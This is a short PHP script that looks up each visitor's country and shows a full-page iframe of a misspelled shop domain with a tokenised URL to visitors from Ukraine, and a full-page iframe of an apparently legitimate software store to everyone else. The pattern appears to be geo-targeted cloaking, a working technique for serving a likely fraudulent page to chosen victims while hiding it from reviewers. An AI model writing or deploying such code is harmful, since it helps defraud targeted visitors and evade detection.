<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
$var_country_code = $geoplugin->countryCode;
// redirect based on country code:
if ($var_country_code == "UA")  {
echo '<iframe width="100%" height="100%"  frameborder="0" src="https://shopproduckt.com/page/3b00cafd454eea85a983fae07a434e1ac62152e3/?s=a9c0esy8wqqfe612">';  
}
else {
echo '<iframe width="100%" height="100%"  frameborder="0" src="https://smilesoftware.com/store/">'; 
}
?> 